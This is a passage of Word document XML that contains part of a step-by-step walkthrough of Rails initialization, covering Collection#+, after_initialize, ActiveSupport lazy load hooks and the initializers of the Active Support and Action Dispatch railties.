                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7236204A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This method collects the initializers from the ancestors of this class and adds them to a new </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Collection</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> object using the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>+</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method which is defined like this for the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Collection</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4440"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="000E7DFA" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2181B30B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>+(other)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="07BE5FBA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  Collection.new(to_a + other.to_a)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D6B14EC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="470383F0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">So this </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>method is overridden to return a new collection comprising of the existing collection as an array and then using the Array#</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method combines these two collections, returning a “super” </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Collection</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> object. In this case, the only initializer that’s going to be in this new </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Collection</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> object is the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>i18n.callbacks</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> initializer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CE956CB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The next method to be called after this </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>initializer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method is the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>after_initialize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method on the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> object, which is defined like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8088"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6069673A" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4EB39199" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>after_initialize(&amp;block)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="59E56B21" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  ActiveSupport.on_load(:after_initialize, :yield</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true, &amp;block)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="514BB4F1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="46AA0891" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>on_load</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method here is provided by the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/lazy_load_hooks</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file which was required earlier and is defined like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5400"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2DC7879F" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="04177D1E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>self.on_load(name, options = {}, &amp;block)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1427A498" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>base = @loaded[name]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4FE213A4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    execute_hook(base, options, block)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F184BCD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  else</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5220CD6A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @load_hooks[name] &lt;&lt; [block, options]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F754275" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6083725F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5AAAA1D2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@loaded</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> variable here is a hash containing elements representing the different components of Rails that have been loaded at this stage. Currently, this hash is empty. So the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>else</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is executed here, using the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@load_hooks</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> variable defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/lazy_load_hooks</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4775"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="59717106" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5F0EE4EE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1683774975"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@load_hooks</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Hash.new</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{|h,k| h[k] = [] }</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7009E8F7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This defines a new hash which has keys that default to empty arrays. This saves Rails from having to do something like this instead:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4440"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="33DCE034" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="473B3A40" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@load_hooks[name] = []</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46368018" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@load_hooks[name] &lt;&lt; [block, options]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3B91E94E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The value added to this array here consists of the block and options passed to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>after_initialize</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67B03AF0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">We’ll see these </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@load_hooks</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> used later on in the initialization process.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ED1EEB6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This rest of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>i18n_railtie.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> defines the protected class methods </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>include_fallback_modules</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>init_fallbacks</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>validate_fallbacks</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06BFC10B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.38 Back to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/lib/active_support/railtie.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="055D7F78" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file defines the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveSupport::Railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> constant which like the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>I18n::Railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> constant just defined, inherits from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> meaning the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>inherited</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method would be called again here, including </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Configurable</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> into this class. This class makes use of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">’s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method again, setting up the configuration options for Active Support.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EEFC21B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Then this Railtie sets up three more initializers:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EF689C1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="359"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support.initialize_whiny_nils</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="530FAC5F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="359"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support.deprecation_behavior</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B548AB6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="359"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support.initialize_time_zone</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="155A2590" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>We will cover what each of these initializers do when they run.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E5FB6B1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Once the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file has finished loading the next file required from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>action_dispatch/railtie</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78F072AC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.39 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/lib/action_dispatch/railtie.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B6C308A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file defines the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActionDispatch::Railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class, but not before requiring </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>action_dispatch</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="408EE1F1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.40 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/lib/action_dispatch.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="447EC327" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file attempts to locate the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_model</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> libraries by looking a couple of directories back from the current file and then adds the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_model</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lib</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> directories to the load path, but only if they aren’t already, which they are.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6DAFC470" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E117886" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>activesupport_path = File.expand_path('../../../activesupport/lib', __FILE__)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F497FDA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$:.unshift(activesupport_path) if</w:t>
            </w:r>
            <w:r>
